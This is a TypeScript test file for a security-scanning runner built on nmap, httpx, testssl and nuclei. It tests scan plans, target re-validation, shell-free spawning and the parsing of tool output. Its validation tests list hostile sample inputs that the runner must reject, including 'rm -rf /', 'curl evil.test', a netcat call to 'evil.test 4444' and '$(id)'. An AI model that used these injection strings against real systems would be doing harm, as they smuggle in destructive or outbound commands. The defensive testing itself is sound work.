import { EventEmitter } from 'node:events';
import { readFileSync } from 'node:fs';
import { PassThrough } from 'node:stream';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { parseProtocolLine, PROTOCOL_PREFIX } from '../../src/output/protocol.js';
import { parseHttpxOutput } from './adapters/httpx.js';
import { parseNmapXml, isPortOpen, webPortUrls } from './adapters/nmap.js';
import { parseNucleiOutput } from './adapters/nuclei.js';
import { parseTestsslJson } from './adapters/testssl.js';
import { INVALID_CONFIG_EXIT, INVALID_CONFIG_LINE, parseRunnerEnv } from './env.js';
import { CHILD_ENV, runTool, validateTargetArgument } from './exec.js';
import { createEmitter, PREFIX } from './emit.js';
import { NUCLEI_EXCLUDED_TAGS, TOOL_PATHS, planFor, progressPercent } from './plan.js';
import type { RunnerEnv } from './env.js';

/**
 * Runner tests (Task 87) — fixtures instead of real tools.
 *
 * The three things that must never regress: no argument reaches a tool through a
 * shell, no target-derived value can arrive in flag position, and the protocol
 * lines this runner emits are exactly the ones Task 85's parser accepts (the two
 * halves of the protocol are tested against each other, not against themselves).
 */

function fixture(name: string): string {
  return readFileSync(fileURLToPath(new URL(`../test-fixtures/${name}`, import.meta.url)), 'utf8');
}

const ENV: RunnerEnv = {
  jobId: 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee',
  jobCode: 'JOB-4471',
  scanType: 'external',
  targetHost: 'api.horizonsacco.co.ke',
  targetIps: ['41.90.64.199'],
  targetCidr: null,
  deadlineSeconds: 840,
};

describe('planFor — the step lists', () => {
  it('external runs httpx → nmap → testssl → nuclei', () => {
    expect(planFor('external', ENV).steps.map((step) => step.kind)).toEqual([
      'httpx',
      'nmap',
      'testssl',
      'nuclei',
    ]);
  });

  it('api runs httpx → nuclei with the API tags', () => {
    const plan = planFor('api', ENV);
    expect(plan.steps.map((step) => step.kind)).toEqual(['httpx', 'nuclei']);
    const nuclei = plan.steps[1]!;
    const tags = nuclei.argv[nuclei.argv.indexOf('-tags') + 1] ?? '';
    expect(tags.split(',')).toEqual(
      expect.arrayContaining(['api', 'swagger', 'graphql', 'jwt', 'cors']),
    );
  });

  it('mobile matches api and carries the honest caveat', () => {
    const plan = planFor('mobile', ENV);
    expect(plan.steps.map((step) => step.kind)).toEqual(['httpx', 'nuclei']);
    expect(plan.notices).toEqual([
      '[~] Mobile package analysis is not available; scanning the API surface only.',
    ]);
  });

  it('internal and network run nmap only (top 1000)', () => {
    for (const scanType of ['internal', 'network'] as const) {
      const plan = planFor(scanType, ENV);
      expect(plan.steps.map((step) => step.kind)).toEqual(['nmap']);
      expect(plan.steps[0]!.argv).toContain('1000');
    }
  });

  it('external nmap uses a connect scan with no raw-socket or OS flags', () => {
    const argv = planFor('external', ENV).steps[1]!.argv;
    expect(argv).toContain('-sT');
    expect(argv).not.toContain('-sS');
    expect(argv).not.toContain('-O');
    expect(argv).not.toContain('--privileged');
    expect(argv).not.toContain('-iL');
    expect(argv).not.toContain('--script');
  });

  it('every nuclei invocation excludes the intrusive tags', () => {
    for (const scanType of ['external', 'api', 'mobile'] as const) {
      const step = planFor(scanType, ENV).steps.find((candidate) => candidate.kind === 'nuclei');
      expect(step, scanType).toBeDefined();
      const excluded = step!.argv[step!.argv.indexOf('-etags') + 1] ?? '';
      expect(excluded.split(',')).toEqual([...NUCLEI_EXCLUDED_TAGS]);
      // No out-of-band callback, and templates come from the image.
      expect(step!.argv).toContain('-ni');
      expect(step!.argv).toContain('/opt/nuclei-templates');
    }
  });

  it('uses absolute binary paths from the fixed table', () => {
    for (const step of planFor('external', ENV).steps) {
      expect(step.bin).toBe(TOOL_PATHS[step.tool]);
      expect(step.bin.startsWith('/')).toBe(true);
    }
  });

  it('no argument contains a shell metacharacter', () => {
    for (const scanType of ['external', 'api', 'mobile', 'internal', 'network'] as const) {
      for (const step of planFor(scanType, ENV).steps) {
        for (const arg of step.argv) {
          expect(arg, `${scanType}/${step.kind}: ${arg}`).not.toMatch(/[;|&`$<>]/);
        }
      }
    }
  });

  it('progress weights total 100 for the external plan and stay under 100', () => {
    const plan = planFor('external', ENV);
    expect(plan.totalWeight).toBe(100);
    let done = 0;
    for (const step of plan.steps) {
      expect(progressPercent(plan, done)).toBeLessThan(100);
      done += step.weight;
    }
    expect(progressPercent(plan, plan.totalWeight)).toBe(99);
  });

  it('progress is monotonic', () => {
    const plan = planFor('external', ENV);
    let previous = -1;
    let done = 0;
    for (const step of plan.steps) {
      const pct = progressPercent(plan, done);
      expect(pct).toBeGreaterThanOrEqual(previous);
      previous = pct;
      done += step.weight;
    }
  });
});

describe('exec — target re-validation', () => {
  it('accepts the shapes the controller already allowed', () => {
    for (const value of ['api.example.com', '41.90.64.199', '93.184.216.0/24']) {
      expect(validateTargetArgument(value), value).toBe(true);
    }
  });

  it('rejects anything starting with a dash — the option-injection vector', () => {
    for (const value of ['-oN', '-oN /tmp/x', '--output', '-sS']) {
      expect(validateTargetArgument(value), value).toBe(false);
    }
  });

  it('rejects shell metacharacters and whitespace', () => {
    for (const value of [
      'example.com;rm -rf /',
      'example.com && curl evil.test',
      'example.com | nc evil.test 4444',
      'example.com\n-oN /tmp/x',
      '$(id)',
      '`id`',
      'a b.com',
      '',
    ]) {
      expect(validateTargetArgument(value), value).toBe(false);
    }
  });

  it('rejects a too-wide CIDR and an over-long value', () => {
    expect(validateTargetArgument('8.0.0.0/16')).toBe(false);
    expect(validateTargetArgument('a'.repeat(300))).toBe(false);
  });

  it('refuses a binary outside the fixed table, before any spawn', async () => {
    let spawned = false;
    const outcome = await runTool(
      {
        bin: '/bin/sh',
        argv: ['-c', 'id'],
        timeoutMs: 1_000,
        onStdoutLine: () => undefined,
      },
      {
        spawnImpl: (() => {
          spawned = true;
          throw new Error('must not be reached');
        }) as never,
      },
    );
    expect(spawned).toBe(false);
    expect(outcome).toEqual({ kind: 'rejected', reason: 'binary_not_allowed' });
  });

  it('refuses a hostile target before any spawn', async () => {
    let spawned = false;
    const outcome = await runTool(
      {
        bin: TOOL_PATHS.nmap,
        argv: ['-sT'],
        timeoutMs: 1_000,
        onStdoutLine: () => undefined,
        targets: ['-oN /tmp/x'],
      },
      {
        spawnImpl: (() => {
          spawned = true;
          throw new Error('must not be reached');
        }) as never,
      },
    );
    expect(spawned).toBe(false);
    expect(outcome).toEqual({ kind: 'rejected', reason: 'invalid_target_argument' });
  });

  it('passes a minimal constructed environment to the child', async () => {
    let seen: Record<string, string> | undefined;
    await runTool(
      { bin: TOOL_PATHS.nmap, argv: ['-sT'], timeoutMs: 1_000, onStdoutLine: () => undefined },
      {
        spawnImpl: ((_bin: string, _argv: string[], options: { env?: Record<string, string> }) => {
          seen = options.env;
          return makeFakeChild();
        }) as never,
      },
    );
    expect(seen).toBeDefined();
    expect(Object.keys(seen ?? {}).sort()).toEqual(['HOME', 'LANG', 'PATH']);
    expect(seen).toEqual(CHILD_ENV);
    expect(seen?.PATH).toBe('/usr/local/bin:/usr/bin');
    // The pod's own environment is not forwarded.
    expect(seen).not.toHaveProperty('VV_JOB_ID');
    expect(seen).not.toHaveProperty('PATH_ORIGINAL');
  });

  it('spawns without a shell', async () => {
    let options: { shell?: boolean; stdio?: unknown; detached?: boolean } | undefined;
    await runTool(
      { bin: TOOL_PATHS.nmap, argv: ['-sT'], timeoutMs: 1_000, onStdoutLine: () => undefined },
      {
        spawnImpl: ((_bin: string, _argv: string[], spawnOptions: typeof options) => {
          options = spawnOptions;
          return makeFakeChild();
        }) as never,
      },
    );
    expect(options?.shell).toBe(false);
    expect(options?.stdio).toEqual(['ignore', 'pipe', 'pipe']);
    // A detached child gets its own process group, so one kill reaches forks.
    expect(options?.detached).toBe(true);
  });
});

/** A minimal stand-in for a ChildProcess that exits immediately. */
function makeFakeChild(): unknown {
  const emitter = new EventEmitter() as EventEmitter & {
    stdout: PassThrough;
    stderr: PassThrough;
    pid: number;
    kill: () => boolean;
  };
  emitter.stdout = new PassThrough();
  emitter.stderr = new PassThrough();
  emitter.pid = 4242;
  emitter.kill = () => true;
  setTimeout(() => {
    emitter.stdout.end();
    emitter.emit('close', 0);
  }, 0);
  return emitter;
}

describe('env — strict configuration', () => {
  const valid = {
    VV_JOB_ID: ENV.jobId,
    VV_JOB_CODE: 'JOB-4471',
    VV_SCAN_TYPE: 'external',
    VV_TARGET_HOST: 'api.example.com',
    VV_TARGET_IPS: '41.90.64.199,41.90.64.200',
    VV_DEADLINE_SECONDS: '840',
  };

  it('accepts a complete environment', () => {
    const result = parseRunnerEnv(valid);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.env.targetIps).toEqual(['41.90.64.199', '41.90.64.200']);
    expect(result.env.targetCidr).toBeNull();
    expect(result.env.deadlineSeconds).toBe(840);
  });

  it.each([
    ['a missing job id', { ...valid, VV_JOB_ID: '' }],
    ['an unknown scan type', { ...valid, VV_SCAN_TYPE: 'everything' }],
    ['a missing target', { ...valid, VV_TARGET_HOST: '' }],
    ['a flag-shaped target', { ...valid, VV_TARGET_HOST: '-oN' }],
    ['a malformed target', { ...valid, VV_TARGET_HOST: 'example.com;rm -rf /' }],
    ['a hostname with no pinned IPs', { ...valid, VV_TARGET_IPS: '' }],
    ['a malformed pinned IP', { ...valid, VV_TARGET_IPS: '999.1.1.1' }],
    ['a bad deadline', { ...valid, VV_DEADLINE_SECONDS: 'abc' }],
    ['a negative deadline', { ...valid, VV_DEADLINE_SECONDS: '-5' }],
    ['a too-wide CIDR', { ...valid, VV_TARGET_CIDR: '8.0.0.0/16' }],
  ])('rejects %s', (_label, source) => {
    expect(parseRunnerEnv(source as Record<string, string>).ok).toBe(false);
  });

  it('accepts a CIDR target without pinned IPs', () => {
    const result = parseRunnerEnv({
      ...valid,
      VV_TARGET_HOST: '93.184.216.0/24',
      VV_TARGET_IPS: '',
      VV_TARGET_CIDR: '93.184.216.0/24',
    });
    expect(result.ok).toBe(true);
  });

  it('reports the invalid-config contract', () => {
    expect(INVALID_CONFIG_LINE).toBe('[!] Invalid runner configuration.');
    expect(INVALID_CONFIG_EXIT).toBe(2);
  });
});

describe('parsers — nmap', () => {
  const result = parseNmapXml(fixture('nmap.xml'));

  it('reports only open ports', () => {
    expect(result.ports.map((port) => port.port)).toEqual([21, 23, 80, 443, 3306]);
  });

  it('renders the summary lines verbatim', () => {
    expect(result.lines).toContain('[*] 41.90.64.199:443/tcp open https nginx 1.24.0');
    expect(result.lines).toContain('[*] 41.90.64.199:23/tcp open telnet');
  });

  it('flags the risky exposures with remediation', () => {
    const titles = result.findings.map((finding) => finding.title);
    expect(titles).toContain('Telnet service exposed');
    expect(titles).toContain('FTP service exposed');
    expect(titles).toContain('MySQL database port exposed');
    for (const finding of result.findings) {
      expect(['high', 'medium']).toContain(finding.severity);
      expect(finding.remediation.length).toBeGreaterThan(10);
      expect(finding.cwe).toMatch(/^CWE-\d+$/);
    }
  });

  it('gates testssl on port 443 and yields web URLs for network scans', () => {
    expect(isPortOpen(result, 443)).toBe(true);
    expect(isPortOpen(result, 8080)).toBe(false);
    expect(webPortUrls(result)).toEqual(
      expect.arrayContaining(['http://41.90.64.199:80', 'https://41.90.64.199:443']),
    );
  });

  it('survives malformed XML', () => {
    expect(parseNmapXml('<nmaprun>').ports).toEqual([]);
    expect(parseNmapXml('').ports).toEqual([]);
    expect(parseNmapXml('not xml at all').ports).toEqual([]);
  });
});

describe('parsers — httpx', () => {
  const result = parseHttpxOutput(fixture('httpx.jsonl').split('\n'));

  it('skips the non-JSON line', () => {
    expect(result.records).toHaveLength(4);
  });

  it('renders status, title and technologies', () => {
    expect(result.lines.join('\n')).toContain('[*] https://api.horizonsacco.co.ke → 200');
    expect(result.lines.join('\n')).toContain('WordPress, PHP, nginx');
  });

  it('reports the missing headers once, on the HTML 200 only', () => {
    const titles = result.findings.map((finding) => finding.title);
    expect(titles).toEqual([
      'Missing Strict-Transport-Security header',
      'Missing Content-Security-Policy header',
    ]);
    for (const finding of result.findings) {
      expect(finding.severity).toBe('low');
      expect(finding.remediation.length).toBeGreaterThan(10);
    }
    // The JSON API and the 404 are not held to the HTML baseline.
    expect(result.findings).toHaveLength(2);
  });
});

describe('parsers — nuclei', () => {
  const result = parseNucleiOutput(fixture('nuclei.jsonl').split('\n'));

  it('drops info-severity templates but counts them', () => {
    expect(result.infoCount).toBe(1);
    expect(result.findings.some((finding) => finding.title === 'Technology Detection')).toBe(false);
  });

  it('skips the malformed trailing line', () => {
    expect(result.findings).toHaveLength(4);
  });

  it('maps severity, CVSS, CWE and remediation', () => {
    const log4j = result.findings.find((f) => f.title.includes('Log4j'));
    expect(log4j?.severity).toBe('critical');
    expect(log4j?.cvss).toBe(10.0);
    expect(log4j?.cwe).toBe('CWE-502');
    expect(log4j?.remediation).toContain('2.17.1');
    expect(log4j?.matchedAt).toBe('https://api.horizonsacco.co.ke/api');
  });

  it('lets a CVSS score raise a mislabelled template', () => {
    const mislabeled = result.findings.find((f) => f.title === 'Mislabelled Template');
    expect(mislabeled?.severity).toBe('critical');
  });

  it('omits extracted results and curl commands from evidence', () => {
    const serialised = JSON.stringify(result);
    expect(serialised).not.toContain('eyJhbGciOiJIUzI1NiJ9');
    expect(serialised).not.toContain('curl -H');
  });
});

describe('parsers — testssl', () => {
  const result = parseTestsslJson(fixture('testssl.json'));

  it('reports MEDIUM and above only', () => {
    expect(result.findings.map((finding) => finding.title)).toEqual([
      'TLS: SSLv2',
      'TLS: TLS1',
      'TLS: certificate expiration',
      'TLS: HSTS',
    ]);
    expect(result.findings.map((finding) => finding.severity)).toEqual([
      'critical',
      'medium',
      'high',
      'medium',
    ]);
    // INFO and LOW are filtered out.
    expect(result.findings.some((f) => f.title.includes('service'))).toBe(false);
    expect(result.findings.some((f) => f.title.includes('cipher order'))).toBe(false);
  });

  it('attaches remediation to every finding', () => {
    for (const finding of result.findings) {
      expect(finding.remediation.length).toBeGreaterThan(10);
    }
  });

  it('survives malformed JSON', () => {
    expect(parseTestsslJson('{').findings).toEqual([]);
    expect(parseTestsslJson('').findings).toEqual([]);
  });
});

describe('emit — protocol round-trip', () => {
  it('every emitted event parses with Task 85 reader', () => {
    const chunks: string[] = [];
    const emitter = createEmitter({ out: { write: (chunk) => chunks.push(chunk) } });

    emitter.phase('Port and service scan');
    emitter.progress(35, 120);
    emitter.finding({
      severity: 'critical',
      title: 'Log4j RCE',
      description: 'Unauthenticated RCE via JNDI.',
      cvss: 10,
      cwe: 'CWE-502',
    });
    emitter.done(0);

    const protocolLines = chunks.filter((chunk) => chunk.startsWith(PROTOCOL_PREFIX));
    expect(protocolLines).toHaveLength(4);
    const parsed = protocolLines.map((line) => parseProtocolLine(line.replace(/\n$/, '')));
    expect(parsed).toEqual([
      { t: 'phase', name: 'Port and service scan' },
      { t: 'progress', pct: 35, etaSec: 120 },
      expect.objectContaining({ t: 'finding', severity: 'critical', cwe: 'CWE-502' }),
      { t: 'done', exit: 0 },
    ]);
  });

  it('never emits a progress of 100 — complete is what moves a job to 100', () => {
    const chunks: string[] = [];
    const emitter = createEmitter({ out: { write: (chunk) => chunks.push(chunk) } });
    emitter.progress(100, null);
    emitter.progress(150, null);
    for (const chunk of chunks) {
      const parsed = parseProtocolLine(chunk.replace(/\n$/, ''));
      if (parsed === null || parsed === 'invalid') continue;
      if (parsed.t === 'progress') expect(parsed.pct).toBeLessThan(100);
    }
  });

  it('narrates findings with the prototype prefixes', () => {
    const chunks: string[] = [];
    const emitter = createEmitter({ out: { write: (chunk) => chunks.push(chunk) } });
    emitter.finding({ severity: 'critical', title: 'RCE', description: 'd' });
    emitter.finding({ severity: 'high', title: 'Weak cipher', description: 'd' });
    emitter.finding({ severity: 'low', title: 'Missing header', description: 'd' });

    const human = chunks.filter((chunk) => !chunk.startsWith(PROTOCOL_PREFIX)).join('');
    expect(human).toContain(`${PREFIX.crit} RCE (critical)`);
    expect(human).toContain(`${PREFIX.warn} Weak cipher (high)`);
    // A low finding is emitted but not narrated.
    expect(human).not.toContain('Missing header');
  });
});
